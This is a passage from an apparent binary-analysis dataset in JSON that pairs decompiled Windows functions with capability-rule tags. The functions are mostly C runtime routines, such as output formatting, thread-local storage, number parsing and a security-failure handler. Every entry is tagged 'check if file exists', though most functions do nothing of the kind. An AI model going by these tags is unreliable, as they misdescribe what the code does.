        "decompiled_code": "\nchar __fastcall fcn.00403c83(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.004069ab(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.004059b1();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[10];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403a1c(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x55692c;\n                    param_1[0xd] = 0x55692c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403eb8(arg_8h, arg_8h_00);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 379
    },
    "00403cfb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00403cfb(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t arg_8h;\n    \n    if (*0x571cd0 == -1) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar2 = fcn.00404197(*0x571cd0);\n    if (iVar2 == -1) {\ncode_r0x00489b00:\n        iVar2 = 0;\n        goto code_r0x00489b46;\n    }\n    if (iVar2 != 0) goto code_r0x00489b46;\n    iVar2 = fcn.004016a4(*0x571cd0, 0xffffffff);\n    if (iVar2 == 0) goto code_r0x00489b00;\n    arg_ch = fcn.004033dc(1, 0x28);\n    if (arg_ch == 0) {\ncode_r0x00489b28:\n        fcn.004016a4(*0x571cd0, 0);\n        iVar2 = 0;\n        arg_8h = arg_ch;\n    }\n    else {\n        iVar2 = fcn.004016a4(*0x571cd0, arg_ch);\n        if (iVar2 == 0) goto code_r0x00489b28;\n        arg_8h = 0;\n        iVar2 = arg_ch;\n    }\n    fcn.00404179(arg_8h);\ncode_r0x00489b46:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return iVar2;\n}\n",
        "token_count": 373
    },
    "00403d6e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d6e(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        do {\n            cVar1 = fcn.00405dfd(arg_ch);\n            if (cVar1 == '\\0') {\n                *arg_14h = -1;\n                iVar2 = -1;\n            }\n            else {\n                *arg_14h = *arg_14h + 1;\n                iVar2 = *arg_14h;\n            }\n        } while ((iVar2 != -1) && (iVar3 = iVar3 + 1,  iVar3 < arg_10h));\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00403e2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403e2c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    piVar1 = *0x57437c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.004052f4();\n    iVar3 = fcn.00402171(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.004065aa(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004058b7();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.004023e2(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x578000)();\n        (*pcVar2)();\n        *0x57437c = piVar1;\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 418
    },
    "00403f5d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403f5d(void)\n\n{\n    if (*0x571e70 != -1) {\n        fcn.004016f9(*0x571e70);\n        *0x571e70 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 60
    },
    "00403fbc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403fbc(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t unaff_EBX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.004016ae(unaff_EBX & 0xffff0000 | arg_ch, arg_14h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00403fcb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403fcb(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00404039": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404039(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.00403e04(arg_ch, arg_14h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00404228": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404228(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x573c24 == -1) {\n        iVar1 = fcn.00402964(arg_8h);\n    }\n    else {\n        iVar1 = fcn.00401186(0x573c24, arg_8h);\n    }\n    return ~-(iVar1 != 0) & arg_8h;\n}\n",
        "token_count": 103
    },
    "004043ef": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004043ef(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((*0x571e70 == -1) || (uVar3 = fcn.0040382d(*0x571e70),  uVar3 == 0)) {\n        iVar4 = fcn.004018b1(*0x571e70, 0xffffffff);\n        if (iVar4 != 0) {\n            uVar3 = fcn.00405088(1, 0x364);\n            if (uVar3 == 0) {\n                fcn.004018b1(*0x571e70, 0);\n                arg_8h = 0;\n            }\n            else {\n                iVar4 = fcn.004018b1(*0x571e70, uVar3);\n                if (iVar4 != 0) {\n                    fcn.004c27a8(uVar3, 0x575218);\n                    fcn.0040640b(0);\n                    goto code_r0x004c2cac;\n                }\n                arg_8h = 0;\n                fcn.004018b1(*0x571e70, 0);\n            }\n            fcn.0040640b(arg_8h);\n        }\n    }\n    else if (uVar3 != 0xffffffff) goto code_r0x004c2cac;\n    uVar3 = 0;\ncode_r0x004c2cac:\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n    uVar3 = -(uVar3 != 0) & uVar3;\n    if (uVar3 == 0) {\n        fcn.00404f39();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 449
    },
    "004044bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004044bc(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        if (arg_10h != 0) goto code_r0x004d48b5;\n    }\n    else if (arg_10h == 0) {\ncode_r0x004d48b5:\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0x16;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    uVar3 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar3 = arg_18h;\n    }\n    if (uVar3 < 0x80000000) {\n        iVar2 = fcn.004d44d5(arg_ch, arg_14h, uVar3, arg_1ch);\n        if (iVar2 == -1) {\n            if (arg_ch != NULL) {\n                *arg_ch = 0;\n            }\n            puVar1 = fcn.00403a35();\n            return *puVar1;\n        }\n        uVar3 = iVar2 + 1;\n        if (arg_ch == NULL) {\n            uVar4 = 0;\n        }\n        else {\n            if (arg_10h < uVar3) {\n                if (arg_18h != 0xffffffff) {\n                    *arg_ch = 0;\n                    puVar1 = fcn.00403a35();\n                    uVar4 = 0x22;\n                    goto code_r0x004d4906;\n                }\n                uVar4 = 0x50;\n                uVar3 = arg_10h;\n            }\n            else {\n                uVar4 = 0;\n            }\n            arg_ch[uVar3 - 1] = 0;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = uVar3;\n        }\n    }\n    else {\n        puVar1 = fcn.00403a35();\n        uVar4 = 0x16;\ncode_r0x004d4906:\n        *puVar1 = uVar4;\n        fcn.004037ce();\n    }\n    return uVar4;\n}\n",
        "token_count": 601
    },
    "0040463d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040463d(void)\n\n{\n    int32_t iVar1;\n    \n    *0x571cd0 = fcn.00406014(fcn.00404f1b);\n    if (*0x571cd0 != -1) {\n        iVar1 = fcn.004016a4(*0x571cd0, 0x5743f4);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        fcn.004027de();\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "00404642": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404642(uint8_t **arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t *arg_ch;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n    }\n    else if (((arg_8h[3] >> 0xd & 1) != 0) && ((arg_8h[3] >> 0xc & 1) == 0)) {\n        if ((arg_8h[3] >> 1 & 1) == 0) {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 1;\n            if ((arg_8h[3] & 0x4c0) == 0) {\n                fcn.00401ffa(arg_8h);\n            }\n            *arg_8h = arg_8h[1];\n            puVar3 = arg_8h[6];\n            arg_ch = arg_8h[1];\n            arg_8h_00 = fcn.00406005(arg_8h);\n            puVar3 = fcn.00402829(arg_8h_00, arg_ch, puVar3);\n            arg_8h[2] = puVar3;\n            puVar3 = arg_8h[2];\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((arg_8h[3] & 6) == 0) {\n                    iVar4 = fcn.00406005(arg_8h);\n                    if ((iVar4 == -1) || (iVar4 = fcn.00406005(arg_8h),  iVar4 == -2)) {\n                        iVar4 = 0x571f68;\n                    }\n                    else {\n                        iVar4 = fcn.00406005(arg_8h);\n                        uVar5 = fcn.00406005(arg_8h);\n                        iVar4 = *((iVar4 >> 6) * 4 + 0x575220) + (uVar5 & 0x3f) * 0x38;\n                    }\n                    if ((*(iVar4 + 0x28) & 0x82) == 0x82) {\n                        LOCK();\n                        arg_8h[3] = arg_8h[3] | 0x20;\n                    }\n                }\n                if (((arg_8h[6] == 0x200) && ((arg_8h[3] >> 6 & 1) != 0)) && ((arg_8h[3] & 0x100) == 0)) {\n                    arg_8h[6] = 0x1000;\n                }\n                arg_8h[2] = arg_8h[2] + -1;\n                uVar1 = **arg_8h;\n                *arg_8h = *arg_8h + 1;\n                return uVar1;\n            }\n            LOCK();\n            arg_8h[3] = arg_8h[3] | (puVar3 != NULL) * 8 + 8;\n            arg_8h[2] = NULL;\n        }\n        else {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 0x10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 800
    },
    "00404764": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004843db)\n\nint32_t __cdecl fcn.00404764(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint8_t *arg_8h_00;\n    uint64_t uVar4;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = &var_4h;\n    }\n    uVar3 = *arg_8h;\n    arg_8h_00 = arg_8h;\n    while (iVar1 = fcn.00405d9e(uVar3),  iVar1 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar3 = *arg_8h_00;\n    }\n    uVar3 = *arg_8h_00;\n    if ((uVar3 == 0x2d) || (uVar3 == 0x2b)) {\n        arg_8h_00 = arg_8h_00 + 1;\n    }\n    else {\n        uVar3 = 0x2b;\n    }\n    uVar4 = fcn.004042f5(arg_8h_00, arg_ch, arg_10h, arg_14h);\n    if (arg_8h_00 == *arg_ch) {\n        *arg_ch = arg_8h;\ncode_r0x004843af:\n        if (uVar4 != 0) goto code_r0x004843f3;\n    }\n    else if (arg_8h == *arg_ch) goto code_r0x004843af;\n    if ((uVar3 != 0x2b) || (uVar4 < 0x8000000000000000)) {\n        if (uVar3 != 0x2d) {\n            return uVar4;\n        }\n        if (uVar4 < 0x8000000000000001) {\n            return -uVar4;\n        }\n    }\ncode_r0x004843f3:\n    iVar1 = 0;\n    puVar2 = fcn.00403a35();\n    *puVar2 = 0x22;\n    if (arg_14h != NULL) {\n        *arg_14h = 1;\n    }\n    if (uVar3 != 0x2d) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 568
    },
    "00404b3d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00404b3d(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    piVar1 = *0x574388;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.004052f4();\n    iVar3 = fcn.00402171(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00401d07(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004058b7();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.004023e2(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x578000)();\n        (*pcVar2)();\n        *0x574388 = piVar1;\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 417
    },
    "00404c64": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404c64(void)\n\n{\n    if (*0x572930 == -2) {\n        fcn.004e1a0d();\n    }\n    return *0x572930 != -1;\n}\n",
        "token_count": 49
    },
    "00404d2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404d2c(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 335
    },
    "00404fb1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00404fb1(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[7] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xb];\n            }\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0x1c);\n                (**0x578000)();\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n                *arg_8h = iVar2;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.00405830(arg_8h, *in_ECX[7], uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                *in_ECX[0xb] = *in_ECX[0xb] - uVar4;\n                *in_ECX[7] = *in_ECX[7] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 613
    },
    "00405191": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00405191(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(*(*(in_FS_OFFSET + 0x2c) + *0x573be4 * 4) + 0x104) < *0x573bc8) {\n        fcn.00405de4(0x573bc8);\n        if (*0x573bc8 == -1) {\n            fcn.00403e86(fcn.00417ef0);\n            fcn.00405e84(0x573bc8);\n        }\n    }\n    return 0x571a48;\n}\n",
        "token_count": 134
    },
    "00405259": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00405259(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    piVar1 = *0x57411c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.004052f4();\n    iVar3 = fcn.00402171(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0040422d(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004058b7();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.004023e2(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x578000)();\n        (*pcVar2)();\n        *0x57411c = piVar1;\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 417
    },
    "00405466": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00405466(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    piVar1 = *0x574354;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.004052f4();\n    iVar3 = fcn.00402171(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00404f57(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004058b7();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.004023e2(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x578000)();\n        (*pcVar2)();\n        *0x574354 = piVar1;\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 415
    },
    "00405655": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00405655(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((*0x571e70 == -1) || (iVar2 = fcn.0040382d(*0x571e70),  iVar2 == 0)) {\n        iVar2 = fcn.004018b1(*0x571e70, 0xffffffff);\n        if (iVar2 == 0) goto code_r0x004c2d8a;\n        iVar2 = fcn.00405088(1, 0x364);\n        if (iVar2 == 0) {\n            fcn.004018b1(*0x571e70, 0);\n        }\n        else {\n            iVar3 = fcn.004018b1(*0x571e70, iVar2);\n            if (iVar3 != 0) {\n                fcn.004c27a8(iVar2, 0x575218);\n                fcn.0040640b(0);\n                goto code_r0x004c2d82;\n            }\n            fcn.004018b1(*0x571e70, 0);\n        }\n        fcn.0040640b(iVar2);\n    }\n    else {\n        if (iVar2 == -1) goto code_r0x004c2d8a;\ncode_r0x004c2d82:\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\ncode_r0x004c2d8a:\n    fcn.00404f39();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 375
    },
    "00405a5b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_22ch\n// WARNING: Variable defined which should be unmapped: var_20ch\n// WARNING: Variable defined which should be unmapped: var_230h\n// WARNING: Variable defined which should be unmapped: var_234h\n\nvoid __cdecl fcn.00405a5b(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint extraout_EDX;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint *puStackY840;\n    uint uStackY836;\n    uint uStackY832;\n    uint *puStackY828;\n    uint *puStackY824;\n    uint arg_8h_00;\n    uint *ExceptionInfo;\n    uint *var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_314h;\n    uint var_2d0h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint32_t var_210h;\n    uchar *var_20ch;\n    uint var_208h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if (arg_8h != -1) {\n        puStackY824 = 0x494225;\n        fcn.00405056();\n    }\n    puStackY828 = &fcn.00405a5b::var_320h;\n    puStackY824 = NULL;\n    uStackY832 = 0x494236;\n    fcn.00403189();\n    uStackY832 = 0x2cc;\n    puStackY840 = &fcn.00405a5b::var_2d0h;\n    uStackY836 = 0;\n    fcn.00403189();\n    ExceptionInfo = &fcn.00405a5b::var_320h;\n    var_324h = &fcn.00405a5b::var_2d0h;\n    var_210h = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffcb8, 0x18) * 0x800 | (in_IF & 1) * 0x200 |\n               (in_TF & 1) * 0x100 | (&stack0xfffffcd0 < 0) * 0x80 | (*0x10 == 0x330) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffcd0 & 0xff) & 1U) == 0) * 4 | 0xffffffe7 < &stack0xfffffcb8 |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_2d0h = 0x10001;\n    var_320h = arg_ch;\n    var_31ch = arg_10h;\n    var_228h = extraout_EDX;\n    var_220h = var_324h;\n    var_20ch = *0x10;\n    iVar1 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    arg_8h_00 = 0;\n    puStackY824 = 0x494309;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    puStackY824 = &fcn.00405a5b::ExceptionInfo;\n    puStackY828 = 0x494316;\n    iVar2 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    if (((iVar2 == 0) && (iVar1 == 0)) && (arg_8h != -1)) {\n        puStackY828 = arg_8h;\n        uStackY832 = 0x49432c;\n        fcn.00405056();\n    }\n    puStackY824 = 0x494338;\n    fcn.004030bc(arg_8h_00);\n    return;\n}\n",
        "token_count": 1062
    },
    "00405b64": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
